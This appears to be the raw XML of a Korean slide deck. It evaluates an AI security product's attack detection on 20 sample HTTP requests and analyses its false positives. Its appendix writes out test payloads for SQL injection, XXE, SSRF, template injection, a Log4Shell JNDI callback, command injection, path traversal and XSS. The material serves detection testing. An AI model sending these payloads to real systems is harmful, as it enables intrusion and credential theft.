                      </a:r>
                    </a:p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SQL 삽입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0.57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87C7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TP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인용부호 종료, AND SLEEP(5), 주석을 조합한 시간 지연형 SQL 삽입이다.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="91440" marT="45720" marB="45720" anchor="ctr">
                    <a:solidFill>
                      <a:srgbClr val="EBF0F4"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="895350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UNION SQL 삽입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87C7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24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UNION SELECT로 users 테이블의 username과 password 조회를 시도한다.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E48371-39EF-4B47-8B79-190FC812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77125"/>
            <a:ext cx="1386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공격 = 공격 의도·모사 패턴 기준. 취약점 존재, 서버 실행 또는 침해 성공을 의미하지 않음.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="206879959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55E02C-0162-49CA-A64A-D63F4E97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화면의 개별 ‘정확도’ 값 해석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7F3B6F-5BB4-4FF7-BA80-9085CBCA2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값의 산식은 미제공. 확률·유사도 여부는 미확인이며, 데이터셋 정확도 70.0%는 별도로 계산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FF0354-BDC9-4B7F-99A8-1DE86D2E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85800" y="2257425"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="13868400" cy="4076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ba8ca367a4942e2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BCDDCE-392B-4589-96AB-81D6849E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13868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주황: FP    청록: TP    회색: TN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62EEAF-45AC-4D4D-8100-30A5119B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0"/>
            <a:ext cx="13868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0.31도 공격, 0.39는 정상. 0.5 기준으로 판정을 재계산할 근거가 없다.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10882433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447774-623A-4F3A-94F7-943B3670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해석의 한계와 후속 검증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FCBAD1-5A44-4EF7-B607-E636CF1E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이번 표본에서는 정상 요청의 오탐 감소가 주요 개선 과제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67BA88-D841-4F80-8601-84B0FE95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240C9A-3BBC-498F-82A4-CD23BBA1F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오탐 6건의 재검토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C00B63-A328-44EE-9479-81E4DC88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90750"/>
            <a:ext cx="1026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S01·S03·S05·S06·S08·S10을 정상 피드백 후보로 검토한다.</a:t>
            </a:r>
          </a:p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어휘만으로 공격을 추정했는지는 모델 내부 근거가 있어야 확인할 수 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446A6F-E1E5-44E8-A444-F8E82D11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입력과 결과 추적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341069-D426-482C-8E1A-8E04CFF0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71875"/>
            <a:ext cx="1026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전송 원문, 파서 payload, 이벤트 ID, 티켓 ID, AI 입력을 연결한다.</a:t>
            </a:r>
          </a:p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모델 버전·전처리·실행 시각을 함께 남겨 같은 조건으로 재평가한다.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7737B7-B99F-43A2-9FAB-CCBEC035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평가 데이터 분리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13F656-FFDC-47FF-AD3E-6631858F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53000"/>
            <a:ext cx="1026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학습에 사용하지 않은 정상·공격 로그로 다시 평가한다.</a:t>
            </a:r>
          </a:p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이번 20건만으로 학습 효과나 운영 환경의 성능 개선을 입증할 수 없다.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FAC231-D859-4ABB-BB5C-3EC838D9E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34250"/>
            <a:ext cx="13868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피드백 저장 완료와 재학습 실행·활성화는 별도 증거가 필요하다. 정상과 공격을 함께 재검증해 오탐·미탐 변화를 확인한다.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34995388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17BBF5-B4B3-428A-8259-090A84FF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원문 부록  S01 · S02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801636-4643-4FA9-AF86-1F3025A7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제공 문자열 전체. 읽기용 줄바꿈을 추가했으며 원문의 개행·인코딩·이스케이프 표기를 유지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A5EDE5-1B23-46EA-9AC7-F93A6E0B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6291EB-150B-485F-A873-8DA4F7C6E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S01   상대경로 리디렉션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5A25FD-4C11-4688-9206-7C258494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0027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rPr>
              <a:t>수동 정상   화면 0.47   모델 공격   FP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3E5181-7BC5-4F6B-A805-6C7AFDCD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GET /redirect?next=%2Fhome HTTP/1.1\r\n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Host: host-37\r\n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Connection: close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5C43D7-55C3-4B50-9292-FEBB0775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S02   파일 업로드 발췌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E77E36-FD25-40AA-9D59-CB7BB6C5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7682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수동 정상   화면 0.39   모델 정상   TN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A8BBCB-B353-40EB-8467-0AAF766C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POST /upload HTTP/1.1\r\n</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:defRPr sz="172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Host: host-11\r\n</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:defRPr sz="172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Content-Type: multipart/form-data; boundary=EVALBOUNDARY\r\n</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:defRPr sz="172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\r\n</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:defRPr sz="172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--EVALBOUNDARY\r\n</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:defRPr sz="172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Content-Disposition: form-data; name="홍길동 11"; filename="C:/ProgramData/Your-Company/SecurityDat</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:defRPr sz="172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a/event-11.dat"</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="82935469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6AE7B3-20A5-462C-95EF-1E99A87B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원문 부록  S03 · S04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0AC46B-E177-4DD1-AAA0-2648BE40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제공 문자열 전체. 읽기용 줄바꿈을 추가했으며 원문의 개행·인코딩·이스케이프 표기를 유지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248AA8-43A0-471C-959C-97B38FB1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3273C6-14B1-4567-8680-067F873F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S03   일반 로그인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DC8085-D70D-4A91-9298-2B14D5E1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0027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rPr>
              <a:t>수동 정상   화면 0.48   모델 공격   FP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7C08D4-05E7-48D7-8A8D-CC466D60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POST /login HTTP/1.1\r\n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Host: host-11\r\n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Content-Type: application/x-www-form-urlencoded\r\n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username=user01&amp;password=incorrect-password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82E041-90D7-4D2F-ADC1-E06646D6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S04   상태 점검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C3F883-A24D-4930-8108-104F15C6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7682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수동 정상   화면 0.30   모델 정상   TN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5858AA-BB18-4BFC-A613-6F82A470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GET /health HTTP/1.1\r\n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Host: host-22\r\n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User-Agent: kube-probe/1.30\r\n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Accept: */*</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="190014089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CF5A00-2E35-410B-BB18-D9946AB8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원문 부록  S05 · S06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CF7E2F-1D50-4533-86BF-A177CFA8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제공 문자열 전체. 읽기용 줄바꿈을 추가했으며 원문의 개행·인코딩·이스케이프 표기를 유지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E63F6C-ED31-4210-8ABA-C63F44972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705E07-9E12-4C64-BE6D-DD542009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S05   JSON 검색 조건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1579F6-A920-453E-85A7-1648E422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0027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rPr>
              <a:t>수동 정상   화면 0.31   모델 공격   FP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A458E2-3091-4448-B6A1-FBC1F47F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POST /api/search HTTP/1.1\r\n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Host: host-11\r\n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Content-Type: application/json\r\n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{"operator":"union","fields":["name","department"],"page":1}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EF6750-CEEC-4C72-B1C1-B60A030D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S06   정상 ping 요청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6F06F2-97BD-4D1E-8BC9-C16CA3F2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7682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rPr>
              <a:t>수동 정상   화면 0.60   모델 공격   FP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FD52C9-4A74-47E1-8ABD-7C5B0210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POST /tools/ping HTTP/1.1\r\n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Host: host-12\r\n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Content-Type: application/x-www-form-urlencoded\r\n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host=127.0.0.1&amp;count=4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="120667410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ED1E7E-8F9C-48A5-9293-47C81E99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원문 부록  S07 · S08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A26929-C420-4DAA-9CBB-E02205A1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제공 문자열 전체. 읽기용 줄바꿈을 추가했으며 원문의 개행·인코딩·이스케이프 표기를 유지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8ED095-47AA-4E6D-BD5D-F82A9B80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95E849-EB74-4350-98DB-3D5E8A114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S07   일반 파일 다운로드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4DB823-1354-4E1D-B071-1C0268C5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0027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수동 정상   화면 0.35   모델 정상   TN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AD06F5-76F9-48B5-B799-B80BDFC3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GET /download?file=quarterly..final.pdf HTTP/1.1\r\n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Host: host-41\r\n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Accept: application/pdf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1761C1-173D-494F-A787-6F5C701E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S08   기술 문서 검색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174FEE-6526-43BC-A89F-F0FB8A20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7682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rPr>
              <a:t>수동 정상   화면 0.43   모델 공격   FP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FDA0D9-7059-4279-9BDA-AD6EFF26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GET /docs/search?q=HTML%20script%20element%20reference HTTP/1.1\r\n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Host: host-3\r\n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Referer: [https://host-3/docs](https://host-3/docs)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="153889352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4F06F2-2962-4A9A-ADE2-B005CE7C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원문 부록  S09 · S10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FFAE94-8035-439D-AFBD-CEB92590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제공 문자열 전체. 읽기용 줄바꿈을 추가했으며 원문의 개행·인코딩·이스케이프 표기를 유지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490E69-38D6-43E6-A5A6-9D3C0ED0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63290D-BF99-43FC-B7B5-83E7F9E3F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S09   자연어 검색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F40050-85F3-4749-A10D-85F5601C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0027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수동 정상   화면 0.27   모델 정상   TN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4EEF5A-944D-45C5-B728-64A8AB7D3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GET /search?q=how%20to%20select%20a%20health%20plan HTTP/1.1\r\n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Host: host-31\r\n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Accept: text/html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D2F624-B70F-443B-8854-D3663B76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S10   상품 목록 조회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7D004F-F9BC-47D7-AB2E-4F6296F3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7682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B45326"/>
                </a:solidFill>
                <a:latin typeface="Malgun Gothic"/>
                <a:ea typeface="Malgun Gothic"/>
                <a:cs typeface="Malgun Gothic"/>
              </a:rPr>
              <a:t>수동 정상   화면 0.65   모델 공격   FP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189090-20B3-421B-B6D4-D7D3BC727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GET /products?id=10&amp;sort=price&amp;direction=asc HTTP/1.1\r\n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Host: host-7\r\n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User-Agent: Mozilla/5.0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30550300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B46862-9FD9-43C1-823E-AB09B008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원문 부록  S11 · S12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6AFD36-437F-4761-AA9A-93A01018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제공 문자열 전체. 읽기용 줄바꿈을 추가했으며 원문의 개행·인코딩·이스케이프 표기를 유지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3C1F84-973A-4029-8D42-5F0AE600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AB2741-23FF-4043-8C3E-4F076871A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S11   CRLF / 헤더 삽입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B523E0-A09C-4CB0-8BD4-5456A8FF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0027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rPr>
              <a:t>수동 공격   화면 0.43   모델 공격   TP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CE06DF-D504-4A88-9214-72F54E930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GET /redirect?next=%2Fhome%0D%0AX-Test-Injected%3A%20true HTTP/1.1\r\n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Host: host-37\r\n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Connection: close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92BC35-6D08-41F1-95AA-618F2734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S12   XML 외부 엔터티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8F2E18-1002-42A4-869E-365D5CBB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7682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rPr>
              <a:t>수동 공격   화면 0.46   모델 공격   TP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CBF70E-490C-4E5B-9859-FFAA79D5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POST /api/import HTTP/1.1\r\n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Host: host-11\r\n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Content-Type: application/xml\r\n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%3C%21DOCTYPE%20r%20%5B%3C%21ENTITY%20x%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fhostname%22%3E%5D%3E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%3Cr%3E%26x%3B%3C%2Fr%3E</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="196285144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F15237-28C2-41FA-B6A9-FE87560F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원문 부록  S13 · S14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5857AD-89BB-4321-91B1-E84A6034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제공 문자열 전체. 읽기용 줄바꿈을 추가했으며 원문의 개행·인코딩·이스케이프 표기를 유지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E37763-C7DE-4400-AED4-96DA54B8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7F03F8-73F4-4483-B95D-F7025CD2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S13   서버 템플릿 삽입 모사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FD4623-5316-49FC-AAC3-27166929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0027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rPr>
              <a:t>수동 공격   화면 0.37   모델 공격   TP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F84FEF-BCB2-4312-A963-9AE72066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GET /welcome?name=%7B%7B7\*7%7D%7D HTTP/1.1\r\n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Host: host-11\r\n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Accept: text/html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5FE338-D7F4-4069-9454-AF5E443C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S14   SSRF 모사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087878-A91B-4213-8CB0-2FA098AF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7682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rPr>
              <a:t>수동 공격   화면 0.67   모델 공격   TP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D10B51-8BA2-4B61-8A0D-294C8E8B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POST /preview HTTP/1.1\r\n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Host: host-22\r\n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Content-Type: application/x-www-form-urlencoded\r\n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url=http%3A%2F%2F192.0.2.20%2Flatest%2Fmeta-data</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="168474624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F07004-9250-439E-A2C9-4DA51C83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원문 부록  S15 · S16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72BB95-8E47-49ED-8344-1637703E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제공 문자열 전체. 읽기용 줄바꿈을 추가했으며 원문의 개행·인코딩·이스케이프 표기를 유지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8F3DAA-1A40-49CA-8B2D-C16D35ACF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698314-E653-4C6E-9105-A6ED114A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S15   Log4Shell 패턴 모사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10C142-7297-4A29-924D-3FAF5920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0027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rPr>
              <a:t>수동 공격   화면 0.51   모델 공격   TP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144496-7FA0-4267-8C5A-2755E98E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GET / HTTP/1.1\r\n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Host: host-11\r\n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User-Agent: ${jndi:ldap\://192.0.2.123:1389/test-only}\r\n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X-Test-Marker: AI-EVAL-9006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2457B0-74AD-465F-951B-ED2C9B01B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S16   OS 명령 삽입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B3AAA0-1479-4207-B5BF-7084F007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7682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rPr>
              <a:t>수동 공격   화면 0.60   모델 공격   TP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FFEB88-A210-4B6F-894B-A3F31EA1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POST /tools/ping HTTP/1.1\r\n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Host: host-12\r\n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Content-Type: application/x-www-form-urlencoded\r\n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host=127.0.0.1%3Bid%3Buname%20-a</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="100521787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336B2D-EB54-4A11-8773-9FA2F530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원문 부록  S17 · S18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C54941-2750-45AB-A72F-43DAFA5B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제공 문자열 전체. 읽기용 줄바꿈을 추가했으며 원문의 개행·인코딩·이스케이프 표기를 유지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3D8757-77E2-45EC-9043-8906713D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46E88B-E2CB-49D8-BCDD-46A888C0E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S17   경로 순회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717FD2-22EA-4B81-9B88-CD67BA58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0027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rPr>
              <a:t>수동 공격   화면 0.63   모델 공격   TP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022C21-ABBA-4343-9447-16B24241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GET /download?file=../../../../etc/passwd HTTP/1.1\r\n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Host: host-41\r\n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Accept: application/octet-stream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C5C6B4-07C1-4DA5-B7C9-CB7490FA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S18   XSS 삽입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B6B15E-76D3-4B9D-93AC-EF3BFF41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7682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rPr>
              <a:t>수동 공격   화면 0.45   모델 공격   TP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563960-94FA-4A02-A0D3-8AB21D10B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GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1\r\n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Host: host-3\r\n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Referer: [https://host-3/](https://host-3/)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="45930637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01461C-C15B-4F7D-8225-6DCA9D5B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원문 부록  S19 · S20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8E7334-2C08-417B-844E-42137CA67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제공 문자열 전체. 읽기용 줄바꿈을 추가했으며 원문의 개행·인코딩·이스케이프 표기를 유지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05A35D-78DA-44E7-B397-3A732908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578C3D-D73E-4D6E-9D4D-0B6CCFB01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S19   시간 지연 SQL 삽입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175F79-A817-4DF9-B3B9-6C0390EF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0027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rPr>
              <a:t>수동 공격   화면 0.57   모델 공격   TP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A284CE-08B4-4BB7-A637-F9154275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POST /login HTTP/1.1\r\n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Host: host-31\r\n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Content-Type: application/x-www-form-urlencoded\r\n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username=admin%27%20AND%20SLEEP%285%29--&amp;password=test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37F09B-79BB-419A-AB8E-23F41EC3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S20   UNION SQL 삽입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CCA454-9CFF-4F57-8D2E-54F063D7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76825"/>
            <a:ext cx="550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87C7A"/>
                </a:solidFill>
                <a:latin typeface="Malgun Gothic"/>
                <a:ea typeface="Malgun Gothic"/>
                <a:cs typeface="Malgun Gothic"/>
              </a:rPr>
              <a:t>수동 공격   화면 1.00   모델 공격   TP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4BD6D1-2F17-4296-9F8B-025893EB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38684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GET /products?id=10%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\r\n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Host: host-7\r\n</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:defRPr sz="1875" b="0">
                <a:solidFill>
                  <a:srgbClr val="18324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83246"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>User-Agent: Mozilla/5.0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="49238284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920356-8BB6-4F69-975D-42D52681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3868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근거 자료와 확인 범위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57A9F8-AE89-4AA4-AC31-CE83395D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386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판정 근거, 계산 결과, 제품 동작 설명의 출처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5F0207-A2B1-4A50-8D0D-C7AC095B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1153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66D7D"/>
                </a:solidFill>
                <a:latin typeface="Malgun Gothic"/>
                <a:ea typeface="Malgun Gothic"/>
                <a:cs typeface="Malgun Gothic"/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DA1E5C-5E23-4278-A5B8-1ABE480C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직접 제공한 증거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623A0C-6BAE-48D8-8684-D39419945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33600"/>
            <a:ext cx="1026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HTTP 요청·화면 값·모델 판정 20건</a:t>
            </a:r>
          </a:p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AI TEST 티켓 목록 20건과 플레이북 화면 1장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AA2409-3E6D-4F30-A37A-71ADF949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7575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제품 동작 참고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17A10B-F294-4F44-BBAE-E9AF12C3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57575"/>
            <a:ext cx="1026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LogGenerator 현재 README의 로그 전송 절차</a:t>
            </a:r>
          </a:p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eyeCloudXOAR v4 사용자 매뉴얼과 플레이북 가이드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F33AE5-85BF-4A04-ACD0-2192D306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공격 유형 기준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61B933-BA4F-4FBF-A9F7-22B21A52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81550"/>
            <a:ext cx="10267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OWASP의 SQL·명령·XML·템플릿 삽입 및 경로 순회 자료</a:t>
            </a:r>
          </a:p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Apache Log4j 보안 공지, RFC 5737, Kubernetes Probe 문서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C89F2E-875D-42BB-80C0-F0DCE899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6A94"/>
                </a:solidFill>
                <a:latin typeface="Malgun Gothic"/>
                <a:ea typeface="Malgun Gothic"/>
                <a:cs typeface="Malgun Gothic"/>
              </a:rPr>
              <a:t>확인 범위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BC447D-352F-4FD3-BC12-2F48706D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334125"/>
            <a:ext cx="102679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제공된 기록의 사후 분석. 서버 수신, 설정 저장, 티켓별 로그 매핑,</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:def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83246"/>
                </a:solidFill>
                <a:latin typeface="Malgun Gothic"/>
                <a:ea typeface="Malgun Gothic"/>
                <a:cs typeface="Malgun Gothic"/>
              </a:rPr>
              <a:t>피드백 DB 반영과 재학습 완료는 직접 검증하지 않았다.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5284429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2026-09-09T03:18:24.7680000Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-09T03:18:24.7680000Z</dcterms:modified>
</coreProperties>
</file>